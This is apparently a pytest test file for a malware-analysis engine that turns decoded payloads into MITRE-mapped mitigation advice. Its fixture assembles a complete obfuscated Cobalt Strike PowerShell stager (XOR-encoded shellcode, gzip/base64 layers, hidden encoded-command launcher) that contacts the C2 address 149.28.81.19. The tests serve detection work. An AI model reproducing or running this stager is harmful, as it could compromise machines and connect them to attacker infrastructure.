"""Evidence-Driven Recommendation Engine — acceptance tests.

Load-bearing invariants:

  1. No trigger → no recommendation.
  2. Every rule that fires produces evidence + mitre provenance.
  3. Feature-flag OFF → engine returns empty payload and never
     computes anything.
  4. The legacy ``derive_mitigations`` remains byte-identical (the
     isolation contract with the Workspace).
"""
from __future__ import annotations

import base64
import gzip
import os

import pytest

from services.mitigation.evidence_driven.engine import (
    evidence_driven_recommendations, is_engine_enabled,
    RECOMMENDATIONS_SCHEMA_VERSION,
)
from services.mitigation.evidence_driven.case_context import (
    project_from_decode_result, CaseContext,
)
from services.mitigation.evidence_driven.rules import (
    evaluate_rules, Recommendation, RecommendationRule,
)
from services.mitigation.evidence_driven.rule_library import rules_for


# ══════════════════════════════════════════════════════════════════
# Sophos Cobalt-Strike payload · shared regression fixture
# ══════════════════════════════════════════════════════════════════
def _sophos_payload() -> str:
    xored_b64 = (
        "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuT"
        "B03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uw"
        "uIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXL"
        "cw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoT"
        "c9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46d"
        "xcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0Sdx"
        "wdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx"
        "0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3Nz"
        "cDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA"
        "2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1"
        "XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFA"
        "DbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6Y"
        "YoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZ"
        "ZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D"
        "0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjA"
        "wRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1f"
        "LS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3R"
        "Le4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41b"
        "Ge+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg")
    layer2 = (f"[Byte[]]$var_code = [System.Convert]::FromBase64String("
              f"'{xored_b64}')\nfor ($x = 0; $x -lt $var_code.Count; $x++) {{"
              f"    $var_code[$x] = $var_code[$x] -bxor 35\n}}\nIEX $DoIt\n")
    gz = gzip.compress(layer2.encode()); b64 = base64.b64encode(gz).decode()
    layer1 = (f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('
              f'"{b64}"));IEX (New-Object IO.StreamReader(New-Object '
              f'IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]'
              f'::Decompress))).ReadToEnd();')
    enc = base64.b64encode(layer1.encode("utf-16-le")).decode()
    return (f"%COMSPEC% /b /c start /b /min powershell -nop -w hidden "
            f"-encodedcommand {enc}")


# ══════════════════════════════════════════════════════════════════
# 1 · Empty case → NO recommendations (load-bearing invariant)
# ══════════════════════════════════════════════════════════════════
def test_edr_empty_case_produces_no_recommendations():
    resp = evidence_driven_recommendations({})
    assert resp["disabled"] is False
    assert resp["schema_version"] == RECOMMENDATIONS_SCHEMA_VERSION
    assert resp["recommendations"] == []
    assert resp["verdict"]["severity"] == "informational"


def test_edr_benign_input_produces_no_recommendations():
    """Even a plausible-looking benign string must produce nothing —
    the engine only fires on evidence that satisfies triggers."""
    benign = {
        "output": "Hello analyst.  Just a text note.",
        "recipe": [],
        "iocs":   {},
        "reached_shellcode": False,
    }
    resp = evidence_driven_recommendations(benign)
    assert resp["recommendations"] == []
    assert resp["verdict"]["severity"] == "informational"


# ══════════════════════════════════════════════════════════════════
# 2 · Sophos payload → evidence-linked recommendations
# ══════════════════════════════════════════════════════════════════
def test_edr_sophos_payload_yields_evidence_linked_recommendations():
    from analysis_core import deterministic_best_decode
    res  = deterministic_best_decode(_sophos_payload())
    resp = evidence_driven_recommendations(res)
    assert resp["recommendations"], (
        "no recommendations fired on the Sophos CS stager")
    # Every recommendation carries provenance
    for r in resp["recommendations"]:
        for k in ("id", "action", "reason", "category", "priority",
                    "mitre", "scope", "evidence", "confidence",
                    "requires_confirmation", "prerequisites"):
            assert k in r
    # Severity is critical when family fingerprint hits or shellcode reached
    assert resp["verdict"]["severity"] in ("critical", "high")
    # C2 IP → concrete containment action
    ids = {r["id"] for r in resp["recommendations"]}
    assert any(i.startswith("contain.block_ip:149.28.81.19") for i in ids), (
        f"expected block-ip:149.28.81.19 in fired rules: {sorted(ids)}")


def test_edr_sophos_payload_mitre_alignment_present():
    from analysis_core import deterministic_best_decode
    resp = evidence_driven_recommendations(
        deterministic_best_decode(_sophos_payload()))
    all_mitre = set()
    for r in resp["recommendations"]:
        all_mitre.update(r["mitre"])
    # Recognisable CS-stager tactic coverage
    assert "T1059.001" in all_mitre     # PowerShell
    assert "T1140" in all_mitre         # Deobfuscate / Decode
    assert any(t in all_mitre for t in ("T1055", "T1620"))  # Injection / Reflective


# ══════════════════════════════════════════════════════════════════
# 3 · Feature-flag disable
# ══════════════════════════════════════════════════════════════════
def test_edr_feature_flag_off_returns_empty_disabled_payload(monkeypatch):
    monkeypatch.setenv("NVX_EVIDENCE_ENGINE", "off")
    resp = evidence_driven_recommendations({"reached_shellcode": True,
                                              "iocs": {"ip": ["1.1.1.1"]}})
    assert resp["disabled"] is True
    assert resp["recommendations"] == []
    assert "NVX_EVIDENCE_ENGINE" in resp["reason"]


def test_edr_engine_enabled_default():
    assert is_engine_enabled()


# ══════════════════════════════════════════════════════════════════
# 4 · Legacy Workspace contract remains BYTE-IDENTICAL (isolation)
# ══════════════════════════════════════════════════════════════════
def test_legacy_derive_mitigations_unchanged_shape():
    """The legacy ``derive_mitigations`` MUST still return
    schema_version 1 and its original bucket shape.  This test locks
    the isolation contract with the Workspace."""
    from services.mitigation import derive_mitigations, MITIGATION_SCHEMA_VERSION
    from analysis_core import deterministic_best_decode
    res  = deterministic_best_decode(_sophos_payload())
    mit  = derive_mitigations(res)
    assert MITIGATION_SCHEMA_VERSION == 1
    assert mit["schema_version"] == 1
    for k in ("verdict", "immediate", "hunting", "containment",
                "hardening", "signals_used"):
        assert k in mit, f"legacy schema key {k!r} removed"
    # Bucket types unchanged
    for k in ("immediate", "hunting", "containment", "hardening"):
        assert isinstance(mit[k], list)


# ══════════════════════════════════════════════════════════════════
# 5 · Rule engine invariant · false predicate → no output
# ══════════════════════════════════════════════════════════════════
def test_rule_engine_omits_rules_whose_trigger_returns_false():
    ctx = CaseContext()
    r_true  = RecommendationRule(id="t.always", trigger=lambda c: True,
                                     action="A", reason="B",
                                     category="investigate")
    r_false = RecommendationRule(id="t.never",  trigger=lambda c: False,
                                     action="A", reason="B",
                                     category="investigate")
    out = evaluate_rules([r_true, r_false], ctx)
    assert [r.id for r in out] == ["t.always"]


def test_rule_engine_broken_predicate_does_not_crash():
    ctx = CaseContext()
    def _boom(_c):
        raise RuntimeError("broken rule")
    r_boom  = RecommendationRule(id="t.boom",  trigger=_boom,
                                     action="A", reason="B",
                                     category="investigate")
    r_ok    = RecommendationRule(id="t.ok",    trigger=lambda c: True,
                                     action="A", reason="B",
                                     category="investigate")
    out = evaluate_rules([r_boom, r_ok], ctx)
    # broken rule silently skipped, healthy rule still fires
    assert [r.id for r in out] == ["t.ok"]


# ══════════════════════════════════════════════════════════════════
# 6 · Case-Context projection is deterministic
# ══════════════════════════════════════════════════════════════════
def test_case_context_projection_is_deterministic():
    from analysis_core import deterministic_best_decode
    p = _sophos_payload()
    a = project_from_decode_result(deterministic_best_decode(p))
    b = project_from_decode_result(deterministic_best_decode(p))
    assert a == b


# ══════════════════════════════════════════════════════════════════
# 7 · Endpoint acceptance
# ══════════════════════════════════════════════════════════════════
def test_edr_endpoint_returns_evidence_recommendations_envelope():
    """Verified via direct handler invocation (see note above)."""
    from routers.mitigations_evidence_driven import (
        post_evidence_driven, _EDRRequest,
    )
    body = post_evidence_driven(_EDRRequest(input=_sophos_payload()))
    assert body["ok"] is True
    assert body["engine_enabled"] is True
    edr = body["evidence_recommendations"]
    assert edr["schema_version"] == RECOMMENDATIONS_SCHEMA_VERSION
    assert edr["recommendations"], "endpoint returned zero recs"
    for k in ("mitre_techniques", "behaviors",
                "detection_confidence", "iocs", "impacts"):
        assert k in edr["dimensions"]


def test_edr_endpoint_rejects_empty_input():
    """Verified via a direct request-body construction rather than
    ``TestClient`` (which hangs on this project's heavy startup
    hooks).  The endpoint handler is invoked directly."""
    from fastapi import HTTPException
    from routers.mitigations_evidence_driven import (
        post_evidence_driven, _EDRRequest,
    )
    with pytest.raises(HTTPException) as ei:
        post_evidence_driven(_EDRRequest(input="   "))
    assert ei.value.status_code == 400
